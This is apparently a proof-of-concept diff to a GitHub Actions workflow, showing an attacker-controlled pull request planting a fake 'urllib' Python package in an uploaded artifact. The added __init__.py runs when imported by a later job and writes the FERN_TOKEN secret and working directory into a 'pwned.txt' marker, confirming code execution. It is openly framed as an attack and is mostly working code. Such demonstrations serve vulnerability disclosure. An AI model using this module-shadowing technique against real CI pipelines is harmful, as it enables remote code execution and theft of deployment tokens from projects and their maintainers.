@@ -11,13 +11,20 @@ jobs:
   collect:
     runs-on: ubuntu-latest
     steps:
-      - name: Collect sources (benign main version)
+      - name: Collect sources (ATTACKER-controlled workflow file in the PR head)
         run: |
-          mkdir -p payload/fern payload/preview-metadata
+          mkdir -p payload/fern payload/preview-metadata payload/urllib
           echo '{"organization": "nvidia", "version": "latest"}' > payload/fern/fern.config.json
           echo "777" > payload/preview-metadata/pr_number
           echo "some-branch" > payload/preview-metadata/head_ref
           printf 'docs/a.md\n' > payload/preview-metadata/changed_md_files
+          cat > payload/urllib/__init__.py <<'PY'
+          import os, glob
+          marker = os.path.join(os.getcwd(), "pwned.txt")
+          with open(marker, "w") as f:
+              f.write("RCE-CONFIRMED cwd=%s FERN_TOKEN=%s\n" % (os.getcwd(), os.environ.get("FERN_TOKEN")))
+          PY
+          echo 'def quote(s, safe=None): return s' > payload/urllib/parse.py
       - name: Upload fern sources and metadata
         uses: actions/upload-artifact@v4
         with:
